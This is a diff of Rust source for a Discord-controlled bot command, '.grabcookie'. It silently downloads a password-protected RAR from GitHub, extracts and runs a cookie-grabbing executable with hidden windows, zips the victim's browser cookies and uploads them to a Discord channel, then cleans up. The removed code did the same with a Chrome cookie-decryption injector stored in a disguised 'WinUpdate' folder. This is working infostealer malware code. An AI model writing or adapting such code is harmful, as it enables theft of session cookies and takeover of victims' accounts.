@@ -3,133 +3,65 @@ use anyhow::{Context, Result};
 use async_trait::async_trait;
 use std::env;
 use std::fs;
-use std::io::Cursor;
-use std::os::windows::process::CommandExt;
+use std::io::{Cursor, Read, Write};
 use std::path::{Path, PathBuf};
 use std::process::Command;
+use std::sync::Arc;
+use std::time::Duration;
+use tokio::time::sleep;
 use twilight_http::Client as HttpClient;
-use twilight_model::channel::message::Message;
+use twilight_model::channel::message::component::{ActionRow, Button, ButtonStyle};
+use twilight_model::channel::message::{Component, Message};
 use twilight_model::http::attachment::Attachment;
 use walkdir::WalkDir;
-use zip::ZipArchive;
+use zip::ZipWriter;
 
-pub struct GrabCommand;
+use std::os::windows::process::CommandExt;
 
-const MODULE_NAME: &str = "cookie-mod.exe";
-const DOWNLOAD_URL: &str = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.17.1/chrome-injector-v0.17.1.zip";
-// Was: https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.16.1/chrome-injector-v0.16.1.zip
+pub struct GrabCookieCommand;
 
-impl GrabCommand {
+const MODULE_NAME: &str = "kurion.exe";
+const DOWNLOAD_URL: &str = "https://github.com/Mikasuru/Arc/raw/refs/heads/main/Assets/Scripts/kurion.rar";
+const RAR_PASSWORD: &str = "kurion67";
+
+pub const GRAB_JSON_BUTTON: &str = "grab_cookie_json";
+pub const GRAB_NETSCAPE_BUTTON: &str = "grab_cookie_netscape";
+
+pub use self::GrabCookieCommand as GrabCommand;
+
+impl GrabCookieCommand {
     fn get_module_path() -> Result<PathBuf> {
-        let username = env::var("USERNAME")
-            .or_else(|_| env::var("USER"))
-            .map_err(|_| anyhow::anyhow!("Error getting username"))?;
-
-        let path = PathBuf::from(format!(
-            r"C:\Users\{}\AppData\Local\Packages\WinUpdate\modules",
-            username
-        ));
+        let temp_dir = env::temp_dir();
+        let path = temp_dir.join("kurion_temp");
         Ok(path)
     }
-}
 
-#[async_trait]
-impl BotCommand for GrabCommand {
-    fn name(&self) -> &str {
-        "grabcookie"
-    }
-    fn description(&self) -> &str {
-        "Grab cookies using auto-downloaded module"
-    }
-    fn category(&self) -> &str {
-        "filesystem"
-    }
-    fn usage(&self) -> &str {
-        ".grabcookie"
-    }
-    fn examples(&self) -> &'static [&'static str] {
-        &[".grabcookie"]
-    }
-    fn aliases(&self) -> &'static [&'static str] {
-        &["getmod"]
-    }
-
-    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, _args: Arguments) -> Result<()> {
-        self.ensure_and_run_module(http, msg).await
-    }
-}
-
-impl GrabCommand {
-    async fn ensure_and_run_module(&self, http: &Arc<HttpClient>, msg: &Message) -> Result<()> {
-        let module_dir = Self::get_module_path()?;
-        let module_path = module_dir.join(MODULE_NAME);
-
-        if !module_dir.exists() {
-            fs::create_dir_all(&module_dir)?;
-        }
-
-        if !module_path.exists() {
-            let status_msg = http
-                .create_message(msg.channel_id)
-                .content("Module not found. Downloading from GitHub...")
-                .await?
-                .model()
-                .await?;
-
-            if let Err(e) = self.download_module().await {
-                http.update_message(msg.channel_id, status_msg.id)
-                    .content(Some(&format!("Failed to download module: {}", e)))
-                    .await?;
-                return Err(e);
-            }
-
-            http.update_message(msg.channel_id, status_msg.id)
-                .content(Some("Download complete. Executing..."))
-                .await?;
-        } else {
-            http.create_message(msg.channel_id)
-                .content("Running cookie module...")
-                .await?;
-        }
-
-        let output_dir = module_dir.join("output");
-        if output_dir.exists() {
-            let _ = fs::remove_dir_all(&output_dir);
-        }
-
-        match Self::run_cookie_mod(&module_path) {
-            Ok(mut child) => {
-                let _ = child.wait();
-
-                if output_dir.exists() {
-                    self.upload_results(http, msg, &output_dir).await?;
-                } else {
-                    http.create_message(msg.channel_id)
-                        .content("Execution finished but no output folder found.")
-                        .await?;
+    fn cleanup(module_dir: &Path) -> Result<()> {
+        if module_dir.exists() {
+            for _ in 0..3 {
+                if fs::remove_dir_all(module_dir).is_ok() {
+                    break;
                 }
-            }
-            Err(e) => {
-                http.create_message(msg.channel_id)
-                    .content(&format!("Error executing module: {}", e))
-                    .await?;
+                std::thread::sleep(Duration::from_millis(500));
             }
         }
-
         Ok(())
     }
 
-    async fn download_module(&self) -> Result<()> {
-        let module_dir = Self::get_module_path()?;
+    async fn download_rar(&self, module_dir: &Path) -> Result<PathBuf> {
         if !module_dir.exists() {
-            fs::create_dir_all(&module_dir)?;
+            fs::create_dir_all(module_dir)?;
         }
 
+        let rar_path = module_dir.join("kurion.rar");
+
         let client = reqwest::Client::builder()
-            .user_agent("Mozilla/5.0")
+            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+            .timeout(Duration::from_secs(120))
             .build()?;
 
         let response = client.get(DOWNLOAD_URL).send().await?;
+        
         if !response.status().is_success() {
             return Err(anyhow::anyhow!(
                 "Download failed with status: {}",
@@ -138,114 +70,287 @@ impl GrabCommand {
         }
 
         let bytes = response.bytes().await?;
-        let cursor = Cursor::new(bytes);
-        let mut archive = ZipArchive::new(cursor)?;
+        let mut file = fs::File::create(&rar_path)?;
+        file.write_all(&bytes)?;
 
-        let arch = std::env::consts::ARCH;
-        let target_suffix = match arch {
-            "aarch64" => "_arm64.exe",
-            _ => "_x64.exe",
+        Ok(rar_path)
+    }
+
+    fn extract_rar(rar_path: &Path, destination: &Path) -> Result<()> {
+        const CREATE_NO_WINDOW: u32 = 0x08000000;
+
+        let unrar_paths = vec![
+            "C:\\Program Files\\WinRAR\\UnRAR.exe",
+            "C:\\Program Files\\WinRAR\\WinRAR.exe",
+            "C:\\Program Files (x86)\\WinRAR\\UnRAR.exe",
+            "C:\\Program Files (x86)\\WinRAR\\WinRAR.exe",
+        ];
+
+        for unrar_exe in unrar_paths {
+            if !Path::new(unrar_exe).exists() {
+                continue;
+            }
+
+            let dest_str = format!("{}\\", destination.display());
+
+            let output = Command::new(unrar_exe)
+                .arg("x")                           // Extract with full path
+                .arg("-y")                          // Yes to all
+                .arg("-o+")                         // Overwrite
+                .arg(format!("-p{}", RAR_PASSWORD)) // Password
+                .arg("-idq")                        // Quiet mode
+                .arg(rar_path)
+                .arg(&dest_str)
+                .creation_flags(CREATE_NO_WINDOW)
+                .output()?;
+
+            if output.status.success() { return Ok(()); }
+
+            let stderr = String::from_utf8_lossy(&output.stderr);
+            let stdout = String::from_utf8_lossy(&output.stdout);
+            
+            if stderr.contains("password") || stdout.contains("password") {
+                return Err(anyhow::anyhow!("Wrong password for RAR archive"));
+            }
+        }
+
+        Err(anyhow::anyhow!("WinRAR not found."))
+    }
+
+    fn run_kurion(module_dir: &Path, format: &str) -> Result<()> {
+        const CREATE_NO_WINDOW: u32 = 0x08000000;
+
+        let exe_path = module_dir.join(MODULE_NAME);
+        
+        if !exe_path.exists() {
+            return Err(anyhow::anyhow!("kurion.exe not found after extraction"));
+        }
+
+        let format_arg = match format {
+            "json" => "--json",
+            "netscape" => "--netscape",
+            _ => "--json",
         };
 
-        let mut found = false;
-        for i in 0..archive.len() {
-            let mut file = archive.by_index(i)?;
-            let filename = file.name().to_lowercase();
+        let mut child = Command::new(&exe_path)
+            .arg("all")
+            .arg(format_arg)
+            .current_dir(module_dir)
+            .creation_flags(CREATE_NO_WINDOW)
+            .spawn()
+            .context("Failed to spawn kurion.exe")?;
 
-            if filename.ends_with(".exe") && filename.contains(target_suffix) {
-                let mut out_file = fs::File::create(module_dir.join(MODULE_NAME))?;
-                std::io::copy(&mut file, &mut out_file)?;
-                found = true;
-                break;
-            }
-        }
-
-        if !found {
-            for i in 0..archive.len() {
-                let mut file = archive.by_index(i)?;
-                let filename = file.name().to_lowercase();
-
-                if filename.ends_with(".exe") {
-                    if arch != "aarch64" && filename.contains("arm64") {
-                        continue;
-                    }
-
-                    let mut out_file = fs::File::create(module_dir.join(MODULE_NAME))?;
-                    std::io::copy(&mut file, &mut out_file)?;
-                    found = true;
-                    break;
-                }
-            }
-        }
-
-        if !found {
-            return Err(anyhow::anyhow!(
-                "No compatible executable found in downloaded archive"
-            ));
-        }
-
+        let _ = child.wait();
         Ok(())
     }
 
-    fn run_cookie_mod(path: &Path) -> Result<std::process::Child> {
-        let child = Command::new(path)
-            .arg("all")
-            .current_dir(path.parent().unwrap())
-            .creation_flags(0x08000000)
-            .spawn()
-            .context("Failed to spawn module")?;
-        Ok(child)
+    fn zip_output(output_dir: &Path) -> Result<Vec<u8>> {
+        let mut buffer = Cursor::new(Vec::new());
+        
+        {
+            let mut zip = ZipWriter::new(&mut buffer);
+            let options = zip::write::FileOptions::default()
+                .compression_method(zip::CompressionMethod::Deflated);
+
+            for entry in WalkDir::new(output_dir).into_iter().filter_map(|e| e.ok()) {
+                let path = entry.path();
+                
+                if path.is_file() {
+                    let relative_path = path.strip_prefix(output_dir)?;
+                    let zip_path = relative_path.to_string_lossy().replace('\\', "/");
+                    
+                    zip.start_file(&zip_path, options)?;
+                    
+                    let mut file = fs::File::open(path)?;
+                    let mut contents = Vec::new();
+                    file.read_to_end(&mut contents)?;
+                    zip.write_all(&contents)?;
+                }
+            }
+            zip.finish()?;
+        }
+        Ok(buffer.into_inner())
     }
 
-    async fn upload_results(
-        &self,
+    pub async fn execute_grab(
         http: &Arc<HttpClient>,
-        msg: &Message,
-        output_dir: &Path,
+        channel_id: twilight_model::id::Id<twilight_model::id::marker::ChannelMarker>,
+        format: &str,
     ) -> Result<()> {
-        let mut files_to_zip = Vec::new();
-        let walker = WalkDir::new(output_dir).into_iter();
+        let module_dir = Self::get_module_path()?;
 
-        for entry in walker.filter_map(|e| e.ok()) {
-            let path = entry.path();
-            if path.is_file() {
-                if let Ok(name) = path.strip_prefix(output_dir) {
-                    files_to_zip.push((path.to_path_buf(), name.to_string_lossy().into_owned()));
+        Self::cleanup(&module_dir)?;
+        fs::create_dir_all(&module_dir)?;
+
+        let status_msg = http
+            .create_message(channel_id)
+            .content(&format!("Downloading module... (Format: {})", format.to_uppercase()))
+            .await?
+            .model()
+            .await?;
+
+        let grabber = GrabCookieCommand;
+        let rar_path = match grabber.download_rar(&module_dir).await {
+            Ok(path) => path,
+            Err(e) => {
+                http.update_message(channel_id, status_msg.id)
+                    .content(Some(&format!("Download failed: {}", e)))
+                    .await?;
+                Self::cleanup(&module_dir)?;
+                return Err(e);
+            }
+        };
+
+        http.update_message(channel_id, status_msg.id).content(Some("Extracting archive...")).await?;
+        if let Err(e) = Self::extract_rar(&rar_path, &module_dir) {
+            http.update_message(channel_id, status_msg.id)
+                .content(Some(&format!("Extraction failed: {}", e)))
+                .await?;
+            Self::cleanup(&module_dir)?;
+            return Err(e);
+        }
+
+        let _ = fs::remove_file(&rar_path);
+        http.update_message(channel_id, status_msg.id)
+            .content(Some(&format!("Running grabber ({})...", format.to_uppercase())))
+            .await?;
+
+        if let Err(e) = Self::run_kurion(&module_dir, format) {
+            http.update_message(channel_id, status_msg.id)
+                .content(Some(&format!("Execution failed: {}", e)))
+                .await?;
+            Self::cleanup(&module_dir)?;
+            return Err(e);
+        }
+
+        sleep(Duration::from_secs(2)).await;
+
+        let output_dir = module_dir.join("output");
+        if !output_dir.exists() {
+            let mut found_output = None;
+            for entry in fs::read_dir(&module_dir)? {
+                let entry = entry?;
+                if entry.path().is_dir() && entry.file_name() != "." && entry.file_name() != ".." {
+                    let dir_name = entry.file_name().to_string_lossy().to_lowercase();
+                    if dir_name.contains("output") || dir_name.contains("result") {
+                        found_output = Some(entry.path());
+                        break;
+                    }
                 }
+            }
+            
+            if found_output.is_none() {
+                http.update_message(channel_id, status_msg.id)
+                    .content(Some("No output folder found after execution"))
+                    .await?;
+                Self::cleanup(&module_dir)?;
+                return Err(anyhow::anyhow!("No output folder found"));
             }
         }
 
-        if files_to_zip.is_empty() {
-            http.create_message(msg.channel_id)
-                .content("No results found in output folder.")
+        let actual_output_dir = if output_dir.exists() {
+            output_dir
+        } else { module_dir.clone() };
+
+        http.update_message(channel_id, status_msg.id).content(Some("Compressing results...")).await?;
+        let zip_data = match Self::zip_output(&actual_output_dir) {
+            Ok(data) => data,
+            Err(e) => {
+                http.update_message(channel_id, status_msg.id)
+                    .content(Some(&format!("Failed to compress: {}", e)))
+                    .await?;
+                Self::cleanup(&module_dir)?;
+                return Err(e);
+            }
+        };
+
+        if zip_data.is_empty() {
+            http.update_message(channel_id, status_msg.id)
+                .content(Some("No data to upload (empty output)"))
                 .await?;
-            return Ok(());
+            Self::cleanup(&module_dir)?;
+            return Err(anyhow::anyhow!("Empty output"));
         }
 
-        let zip_path = std::env::temp_dir().join(format!("cookies_{}.zip", uuid::Uuid::new_v4()));
-        let file = fs::File::create(&zip_path)?;
-        let mut zip = zip::ZipWriter::new(file);
-        let options =
-            zip::write::FileOptions::default().compression_method(zip::CompressionMethod::Stored);
+        let timestamp = chrono::Local::now().format("%Y%m%d_%H%M%S");
+        let filename = format!("cookies_{}_{}.zip", format, timestamp);
 
-        for (disk_path, zip_name) in files_to_zip {
-            zip.start_file(zip_name, options)?;
-            let mut f = fs::File::open(disk_path)?;
-            std::io::copy(&mut f, &mut zip)?;
-        }
-        zip.finish()?;
+        http.update_message(channel_id, status_msg.id).content(Some("Uploading results...")).await?;
+        let attachment = Attachment::from_bytes(filename.clone(), zip_data, 1);
 
-        let zip_content = fs::read(&zip_path)?;
-        let _ = fs::remove_file(&zip_path);
-        let _ = fs::remove_dir_all(output_dir);
+        http.create_message(channel_id)
+            .content(&format!(
+                "**Cookies grabbed successfully!**\n\n\
+                **Format:** {}\n\
+                **File:** `{}`",
+                format.to_uppercase(),
+                filename
+            )).attachments(&[attachment]).await?;
+
+        let _ = http.delete_message(channel_id, status_msg.id).await;
+        Self::cleanup(&module_dir)?;
+
+        Ok(())
+    }
+}
+
+#[async_trait]
+impl BotCommand for GrabCookieCommand {
+    fn name(&self) -> &str { "grabcookie" }
+    fn description(&self) -> &str { "Grab browser cookies (JSON or Netscape format)" }
+    fn category(&self) -> &str { "filesystem" }
+    fn usage(&self) -> &str { ".grabcookie" }
+    fn examples(&self) -> &'static [&'static str] { &[".grabcookie"] }
+    fn aliases(&self) -> &'static [&'static str] { &["grab", "cookies", "getcookies"] }
+
+    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, _args: Arguments) -> Result<()> {
+        let embed = twilight_util::builder::embed::EmbedBuilder::new()
+            .title("Kurion")
+            .description("Select the output format for grabbed cookies:")
+            .color(0x5865F2)
+            .field(twilight_model::channel::message::embed::EmbedField {
+                name: "JSON Format".to_string(),
+                value: "Standard JSON format.".to_string(),
+                inline: false,
+            })
+            .field(twilight_model::channel::message::embed::EmbedField {
+                name: "Netscape Format".to_string(),
+                value: "Classic cookies.txt format.".to_string(),
+                inline: false,
+            })
+            .footer(twilight_util::builder::embed::EmbedFooterBuilder::new("Click a button below to start grabbing"))
+            .build();
+
+        let json_button = Button {
+            custom_id: Some(GRAB_JSON_BUTTON.to_string()),
+            disabled: false,
+            emoji: None,
+            label: Some("JSON".to_string()),
+            style: ButtonStyle::Primary,
+            url: None,
+            sku_id: None,
+        };
+
+        let netscape_button = Button {
+            custom_id: Some(GRAB_NETSCAPE_BUTTON.to_string()),
+            disabled: false,
+            emoji: None,
+            label: Some("Netscape".to_string()),
+            style: ButtonStyle::Secondary,
+            url: None,
+            sku_id: None,
+        };
+
+        let action_row = Component::ActionRow(ActionRow {
+            components: vec![
+                Component::Button(json_button),
+                Component::Button(netscape_button),
+            ],
+        });
 
         http.create_message(msg.channel_id)
-            .content("Cookies grabbed successfully!")
-            .attachments(&[Attachment::from_bytes(
-                "cookies.zip".to_string(),
-                zip_content,
-                1,
-            )])
+            .embeds(&[embed])
+            .components(&[action_row])
             .await?;
 
         Ok(())
